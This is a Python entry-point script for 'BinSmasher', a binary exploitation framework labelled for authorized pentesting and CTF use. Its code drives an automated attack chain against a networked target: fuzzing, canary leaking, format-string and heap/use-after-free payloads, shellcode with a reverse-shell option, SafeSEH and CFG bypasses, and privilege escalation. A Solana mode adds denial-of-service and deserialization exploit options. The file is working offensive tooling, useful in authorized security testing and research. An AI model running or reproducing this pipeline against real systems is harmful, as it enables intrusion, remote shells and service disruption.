#!/usr/bin/env python3
"""
BinSmasher – main.py
Ultimate Cross-Platform Binary Exploitation Framework.
For authorized pentesting, CTF, and security research only.

Usage
──────
  binary subcommand:
    python main.py binary -b ./vuln_server --host 127.0.0.1 --port 4444 --test-exploit

  solana subcommand:
    python main.py solana --rpc http://localhost:8899 --exploit-type dos-quic
"""

import sys
import argparse
import subprocess
import logging

from rich.console import Console
from rich.panel import Panel

from utils import ExploitConfig, RichHelpFormatter, setup_logging, print_summary
from analyzer import BinaryAnalyzer
from fuzzer import Fuzzer
from exploiter import ExploitGenerator

console = Console()
log: logging.Logger = None  # type: ignore


# ────────────────────────────────────────────
# Banner
# ────────────────────────────────────────────

def get_banner() -> str:
    try:
        text = subprocess.check_output(
            ["figlet", "-f", "slant", "BinSmasher"], stderr=subprocess.DEVNULL
        ).decode()
    except (FileNotFoundError, subprocess.SubprocessError):
        text = "  ____  _       ____                     _\n | __ )(_)_ __ / ___| _ __ ___   __ _ _| |_  ___ _ __\n |  _ \\| | '_ \\\\___ \\| '_ ` _ \\ / _` / __||/ _ \\ '__|\n | |_) | | | | |___) | | | | | | (_| \\__ \\|  __/ |\n |____/|_|_| |_|____/|_| |_| |_|\\__,_|___/ \\___|_|\n"
    return (
        f"[bold cyan]{text}[/]\n"
        "[bold white]Ultimate Cross-Platform Binary Exploitation Framework[/]\n"
        "[dim]Authorized use only: CTF · pentest · security research[/]"
    )


# ────────────────────────────────────────────
# CLI
# ────────────────────────────────────────────

def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description="BinSmasher — binary exploitation framework",
        formatter_class=RichHelpFormatter,
        epilog=(
            "Subcommands:\n"
            "  binary   Exploit native ELF/PE binaries\n"
            "  solana   Agave / Solana SVM security audit\n"
        ),
    )
    sub = parser.add_subparsers(dest="mode", required=True)

    # ── binary ────────────────────────────────────────────────────────────────
    bp = sub.add_parser("binary", help="Exploit native binaries",
                        formatter_class=RichHelpFormatter)

    bp.add_argument("-b", "--binary",       required=True, help="Path to target binary")
    bp.add_argument("-c", "--cmd",          default="id",  help="Command to run via shellcode")
    bp.add_argument("-p", "--pattern-size", type=int, default=200, help="Cyclic pattern size")
    bp.add_argument("-r", "--return-addr",  default=None,  help="Hex return address (auto if omitted)")
    bp.add_argument("--return-offset",      type=int, default=80)
    bp.add_argument("-t", "--test-exploit", action="store_true", help="Fire exploit and check output")
    bp.add_argument("-l", "--log-file",     default="binsmasher.log")

    net = bp.add_argument_group("network")
    net.add_argument("--host",         default="localhost")
    net.add_argument("--port",         type=int, default=4444)
    net.add_argument("--tls",          action="store_true")
    net.add_argument("--output-ip",    default="127.0.0.1")
    net.add_argument("--output-port",  type=int, default=6666)

    pay = bp.add_argument_group("payload")
    pay.add_argument("--reverse-shell", action="store_true")
    pay.add_argument("--file-input",    choices=["mp3", "raw"])
    pay.add_argument("--binary-args",   default="", help="Args for target binary (quoted string)")

    fzg = bp.add_argument_group("fuzzing")
    fzg.add_argument("--fuzz",          action="store_true", help="boofuzz network fuzzing")
    fzg.add_argument("--mutation-fuzz", action="store_true", help="Built-in mutation fuzzer")
    fzg.add_argument("--afl-fuzz",      action="store_true", help="AFL++ coverage fuzzing")
    fzg.add_argument("--afl-timeout",   type=int, default=60, help="AFL++ runtime seconds")
    fzg.add_argument("--frida",         action="store_true", help="Frida dynamic analysis")
    fzg.add_argument("--protocol",      choices=["raw", "http"], default="raw")

    adv = bp.add_argument_group("advanced exploits")
    adv.add_argument("--heap-exploit",          action="store_true")
    adv.add_argument("--safeseh-bypass",        action="store_true")
    adv.add_argument("--privilege-escalation",  action="store_true")

    # ── solana ────────────────────────────────────────────────────────────────
    sp = sub.add_parser("solana", help="Agave / Solana SVM auditing",
                        formatter_class=RichHelpFormatter)
    sp.add_argument("--rpc",          default="http://localhost:8899", dest="solana_rpc")
    sp.add_argument("--source-path",  default=None, help="Agave repo path for unsafe grep")
    sp.add_argument("-b", "--binary", default=None, help="Agave validator binary (optional)")
    sp.add_argument("-l", "--log-file", default="binsmasher_solana.log")
    sp.add_argument("--exploit-type", dest="agave_exploit_type",
                    choices=["svm-bpf", "deser", "dos-quic", "snapshot-assert"])
    sp.add_argument("--bpf-fuzz",     action="store_true")
    sp.add_argument("--host",         default="localhost")
    sp.add_argument("--port",         type=int, default=8900)

    return parser


# ────────────────────────────────────────────
# Binary exploitation flow
# ────────────────────────────────────────────

def run_binary(cfg: ExploitConfig) -> None:
    global log

    analyzer = BinaryAnalyzer(cfg.binary, cfg.log_file)
    platform, arch = analyzer.setup_context()

    findings, target_function, functions = analyzer.static_analysis()
    if not functions:
        log.error("No functions detected — cannot proceed.")
        print_summary(None, None, None, "None", "Failed", None, None,
                      ["Run: r2 -c afl <binary> to verify functions"])
        return

    (stack_exec, nx, aslr, canary_enabled,
     relro, safeseh, cfg_flag, fortify, pie, shadow_stack) = analyzer.check_protections()

    fuzzer    = Fuzzer(cfg.binary, cfg.host, cfg.port, cfg.log_file, platform)
    exploiter = ExploitGenerator(
        cfg.binary, platform, cfg.host, cfg.port,
        cfg.log_file, cfg.tls, cfg.binary_args,
    )

    # Fuzzing phase
    if cfg.afl_fuzz:
        fuzzer.afl_fuzz(cfg.binary_args_list, timeout_sec=cfg.afl_timeout)
    if cfg.mutation_fuzz:
        fuzzer.mutation_fuzz()
    if cfg.fuzz:
        fuzzer.fuzz_target(cfg.file_input, cfg.protocol, cfg.binary_args_list)
    if cfg.frida:
        analyzer.frida_analyze(cfg.binary_args_list)

    # Library offsets
    lib_name, lib_version, offsets, base_addr = analyzer.load_library_offsets()

    # Offset detection
    offset, stack_addr, target_function = exploiter.find_offset(
        cfg.pattern_size, functions, retries=5
    )
    suggestions = []

    if offset is None or stack_addr is None:
        suggestions += [
            f"Verify server is running: nc -zv {cfg.host} {cfg.port}",
            f"Inspect functions: r2 -c afl {cfg.binary}",
        ]
        log.error("Could not determine offset or stack address.")
        print_summary(None, None, None, "None", "Failed",
                      None, target_function, suggestions)
        return

    # Canary
    canary = None
    if canary_enabled:
        canary = exploiter.leak_canary(brute_force=(arch in ("i386", "arm")))
        if not canary:
            suggestions.append("Canary leak failed — increase fmt string index range")

    # Format string payload
    fmt_payload = None
    if findings["format_string_functions"]:
        fmt_payload = exploiter.generate_format_string_payload(offset, relro)

    # Return address guard
    if cfg.return_addr:
        return_addr = int(cfg.return_addr, 16)
        log.info(f"Using provided return address: {hex(return_addr)}")
    else:
        if stack_addr is None:
            log.error("stack_addr is None — cannot compute return address.")
            return
        return_addr = stack_addr + cfg.return_offset
        log.info(f"Calculated return address: {hex(return_addr)}")

    # Shellcode
    shellcode = None
    if not fmt_payload:
        shellcode = exploiter.generate_shellcode(
            cfg.cmd, cfg.output_ip, cfg.output_port, arch, cfg.reverse_shell
        )
        if cfg.file_input:
            exploiter.craft_file_payload(cfg.file_input, offset, shellcode or b"\x90" * 16)
        if not shellcode:
            log.error("Shellcode generation failed.")
            print_summary(offset, stack_addr, return_addr, "None", "Failed",
                          canary, target_function, suggestions)
            return

    # Heap exploits
    if cfg.heap_exploit and findings["heap_functions"]:
        exploiter.create_heap_exploit(offset, base_addr, offsets, lib_version or "2.31")
    if findings["heap_functions"]:
        exploiter.create_uaf_exploit(offset, base_addr, offsets)

    # Main exploit
    success, exploit_type, used_function = exploiter.create_exploit(
        offset=offset, shellcode=shellcode, return_addr=return_addr,
        test_exploit=cfg.test_exploit, return_offset=cfg.return_offset,
        nx=nx, aslr=aslr, canary_enabled=canary_enabled,
        format_string_payload=fmt_payload,
        functions=functions, file_input=cfg.file_input,
        canary=canary, relro=relro, safeseh=safeseh, cfg=cfg_flag,
        findings=findings, base_addr=base_addr, offsets=offsets,
        libc_version=lib_version or "2.31", pie=pie,
    )

    # Windows extra
    if platform == "windows":
        if cfg.safeseh_bypass:
            exploiter.create_safeseh_bypass(offset, safeseh)
        if cfg_flag == "Enabled":
            exploiter.cfg_bypass(offset)

    # Post-exploitation
    if success and cfg.privilege_escalation:
        exploiter.attempt_privilege_escalation()

    if success:
        suggestions.append("Exploit sent — verify output on your listener")
    else:
        suggestions += [
            "Try --heap-exploit for heap-based paths",
            "Try --mutation-fuzz to find additional crash inputs",
            "Use gdb/r2 to inspect memory and verify offsets",
            "Increase --return-offset for ASLR brute",
        ]

    print_summary(
        offset, stack_addr, return_addr, exploit_type,
        "Success" if success else "Failed",
        canary, used_function or target_function, suggestions,
    )


# ────────────────────────────────────────────
# Solana / Agave flow
# ────────────────────────────────────────────

def run_solana(args: argparse.Namespace) -> None:
    fuzzer = Fuzzer(
        args.binary or "/dev/null",
        args.host, args.port,
        args.log_file, "linux",
    )

    if args.source_path and args.binary:
        analyzer = BinaryAnalyzer(args.binary, args.log_file)
        analyzer.grep_unsafe_source(args.source_path)

    if args.bpf_fuzz or args.agave_exploit_type == "svm-bpf":
        fuzzer.fuzz_bpf(args.solana_rpc)

    etype = args.agave_exploit_type
    if etype == "deser":
        fuzzer.exploit_deser(args.solana_rpc)
    elif etype == "dos-quic":
        fuzzer.dos_quic()
    elif etype == "snapshot-assert":
        fuzzer.exploit_snapshot_assert(args.solana_rpc)

    log.info("Solana/Agave audit completed.")


# ────────────────────────────────────────────
# Entry point
# ────────────────────────────────────────────

def main() -> None:
    global log
    parser = build_parser()
    args   = parser.parse_args()

    console.print(Panel(get_banner(), title="BinSmasher 🔨", border_style="cyan"))
    console.print(Panel(
        "[bold yellow]WARNING[/]: Use only on systems you own or have "
        "explicit written authorization to test.\n"
        "Unauthorized access is illegal.",
        title="⚠️  Ethics Notice", border_style="yellow",
    ))

    if args.mode == "binary":
        cfg = ExploitConfig(
            binary        = args.binary,
            host          = args.host,
            port          = args.port,
            pattern_size  = args.pattern_size,
            return_addr   = args.return_addr,
            return_offset = args.return_offset,
            test_exploit  = args.test_exploit,
            log_file      = args.log_file,
            output_ip     = args.output_ip,
            output_port   = args.output_port,
            reverse_shell = args.reverse_shell,
            cmd           = args.cmd,
            fuzz          = args.fuzz,
            afl_fuzz      = args.afl_fuzz,
            frida         = args.frida,
            file_input    = args.file_input,
            protocol      = args.protocol,
            tls           = args.tls,
            heap_exploit  = args.heap_exploit,
            safeseh_bypass        = args.safeseh_bypass,
            privilege_escalation  = args.privilege_escalation,
            binary_args   = args.binary_args,
            afl_timeout   = args.afl_timeout,
            mutation_fuzz = args.mutation_fuzz,
        )
        log = setup_logging(cfg.log_file)
        cfg.validate()
        run_binary(cfg)

    elif args.mode == "solana":
        log = setup_logging(args.log_file)
        run_solana(args)


if __name__ == "__main__":
    main()
